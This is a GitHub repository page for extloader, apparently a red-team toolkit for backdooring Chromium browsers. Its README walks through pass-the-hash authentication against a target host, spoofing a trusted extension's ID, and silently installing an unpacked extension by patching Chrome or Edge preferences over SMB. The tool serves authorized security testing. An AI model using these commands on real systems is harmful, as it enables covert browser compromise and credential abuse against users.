# https://github.com/synacktiv/extloader

[Skip to content](https://github.com/synacktiv/extloader#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/synacktiv/extloader) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/synacktiv/extloader) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/synacktiv/extloader) to refresh your session.Dismiss alert

{{ message }}

main

[**1** Branch](https://github.com/synacktiv/extloader/branches) [**0** Tags](https://github.com/synacktiv/extloader/tags)

[Go to Branches page](https://github.com/synacktiv/extloader/branches)[Go to Tags page](https://github.com/synacktiv/extloader/tags)

Go to file

Code

Open more actions menu

## Latest commit

![author](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=40)

Riadh B

[readme update](https://github.com/synacktiv/extloader/commit/eeee0bbc0eb8e2ad42b6eb29e94f34254be54b99)

last yearOct 2, 2025

[eeee0bb](https://github.com/synacktiv/extloader/commit/eeee0bbc0eb8e2ad42b6eb29e94f34254be54b99) · last yearOct 2, 2025

## History

[3 Commits](https://github.com/synacktiv/extloader/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/synacktiv/extloader/commits/main/) 3 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [extension](https://github.com/synacktiv/extloader/tree/main/extension "extension") | [extension](https://github.com/synacktiv/extloader/tree/main/extension "extension") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [samples](https://github.com/synacktiv/extloader/tree/main/samples "samples") | [samples](https://github.com/synacktiv/extloader/tree/main/samples "samples") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [src/extloader](https://github.com/synacktiv/extloader/tree/main/src/extloader "This path skips through empty directories") | [src/extloader](https://github.com/synacktiv/extloader/tree/main/src/extloader "This path skips through empty directories") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [.gitignore](https://github.com/synacktiv/extloader/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/synacktiv/extloader/blob/main/.gitignore ".gitignore") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [Dockerfile](https://github.com/synacktiv/extloader/blob/main/Dockerfile "Dockerfile") | [Dockerfile](https://github.com/synacktiv/extloader/blob/main/Dockerfile "Dockerfile") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [LICENSE](https://github.com/synacktiv/extloader/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/synacktiv/extloader/blob/main/LICENSE "LICENSE") | [Create LICENSE](https://github.com/synacktiv/extloader/commit/04525c66105823d85ab7f649595c47b98372dcbb "Create LICENSE") | last yearOct 2, 2025 |
| [README.md](https://github.com/synacktiv/extloader/blob/main/README.md "README.md") | [README.md](https://github.com/synacktiv/extloader/blob/main/README.md "README.md") | [readme update](https://github.com/synacktiv/extloader/commit/eeee0bbc0eb8e2ad42b6eb29e94f34254be54b99 "readme update") | last yearOct 2, 2025 |
| [pyproject.toml](https://github.com/synacktiv/extloader/blob/main/pyproject.toml "pyproject.toml") | [pyproject.toml](https://github.com/synacktiv/extloader/blob/main/pyproject.toml "pyproject.toml") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [smb-loader.sh](https://github.com/synacktiv/extloader/blob/main/smb-loader.sh "smb-loader.sh") | [smb-loader.sh](https://github.com/synacktiv/extloader/blob/main/smb-loader.sh "smb-loader.sh") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| [uv.lock](https://github.com/synacktiv/extloader/blob/main/uv.lock "uv.lock") | [uv.lock](https://github.com/synacktiv/extloader/blob/main/uv.lock "uv.lock") | [init](https://github.com/synacktiv/extloader/commit/b59ac45888178df3c534bba0d51ab63e2802c3c6 "init") | last yearOct 2, 2025 |
| View all files |

## Repository files navigation

# extLoader

[Permalink: extLoader](https://github.com/synacktiv/extloader#extloader)

A small toolkit for managing and deploying unpacked Chromium extensions.

> Find out more in the following blogpost: [https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways](https://www.synacktiv.com/en/publications/the-phantom-extension-backdooring-chrome-through-uncharted-pathways)

## Installation

[Permalink: Installation](https://github.com/synacktiv/extloader#installation)

### Direct install (pipx)

[Permalink: Direct install (pipx)](https://github.com/synacktiv/extloader#direct-install-pipx)

```
pipx install .
extloader --help
```

> Use `pipx` for an isolated install targeting Python 3.10+.

### Development setup (uv)

[Permalink: Development setup (uv)](https://github.com/synacktiv/extloader#development-setup-uv)

```
uv venv
source .venv/bin/activate
uv pip install -e .
```

## Authentication Options

[Permalink: Authentication Options](https://github.com/synacktiv/extloader#authentication-options)

- Password: `-p/--password`
- Hash: `-H/--hash` (LM:NT format or just NT)
- Domain: `-d/--domain` (defaults to WORKGROUP)

## Common Parameters

[Permalink: Common Parameters](https://github.com/synacktiv/extloader#common-parameters)

- `-t, --target`: Target IP/hostname
- `-u, --username`: Username
- `-i, --index`: User index from check command
- `--debug`: Enable debug logging

## Usage

[Permalink: Usage](https://github.com/synacktiv/extloader#usage)

Here's a step-by-step example of deploying an extension:

1. First, check available targets:

```
# This will list available users and browsers
extloader check -t 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlm_hash -d corp.local

┏━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Index  ┃ Browser         ┃ User (SID)                                                   ┃
┡━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│   1    │ Chrome          │ john.doe (S-1-5-21-4196007090-2879228606-3183820935-1122)    │
│   2    │ Microsoft Edge  │ john.doe (S-1-5-21-4196007090-2879228606-3183820935-1122)    │
└────────┴─────────────────┴──────────────────────────────────────────────────────────────┘
```

> When running exploit on a different machine, always run the `check` command before to refresh the context (`available_targets.json`).

2. Prepare the manifest (sign or spoof an ID):

```
# Create a deterministic crx_id by adding a key to the manifest.json
extloader sign --extension ./my-extension
```

> To spoof an existing extension ID, skip the command above and set the manifest
> `key` to the base64 public key of the extension you are mimicking. Reusing that
> key keeps the CRX ID unchanged.

3. Deploy the extension:

```
# Deploy to user index 1 (Chrome of john.doe)
extloader exploit -t 192.168.1.100 -u admin -H ntlm_hash -i 1 --extension ./my-extension
```

4.(Alternative) Package for manual deployment:

```
# Bundle the signed extension with the captured Preferences file
extloader package --prefs-file "Preferences" --extension-dir ./my-extension --target-dir "C:\\Users\\Public"

# This creates a ZIP containing:
# - Signed extension files
# - Updated preferences files
# - Deployment instructions
```

> `--prefs-file` expects the browser profile preferences you backed up (Chrome/Edge store them as `Secure Preferences`, other Chromium browsers use `Preferences`). The loader copies it, patches it, and includes both the modified and untouched versions in the package.

```
├── extension/
│   └── chrome-mv3/
├── preferences/
│   ├── brave/
│   ├── chrome/
│   ├── chromium/
    [...]
└── info.json
```

5. Restore original preferences if needed:

```
# Restore original preferences for user index 1 (need check command to get the correct context)
extloader restore -t 192.168.1.100 -u admin -H ntlm_hash -i 1 -f ./backup_preferences
```

## TODO

[Permalink: TODO](https://github.com/synacktiv/extloader#todo)

- Kerberos support
- nxc module
- Adapt `package` workflow for Linux
- Adapt `package` worflow for macOS

## About

A chromium extension exploitation toolkit

### Resources

[Readme](https://github.com/synacktiv/extloader#readme-ov-file)

[GPL-3.0 license](https://github.com/synacktiv/extloader#GPL-3.0-1-ov-file)

[Activity](https://github.com/synacktiv/extloader/activity)

[Custom properties](https://github.com/synacktiv/extloader/custom-properties)

### Stars

**29** stars

### Watchers

**0** watching

### Forks

[**2** forks](https://github.com/synacktiv/extloader/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsynacktiv%2Fextloader&report=synacktiv+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.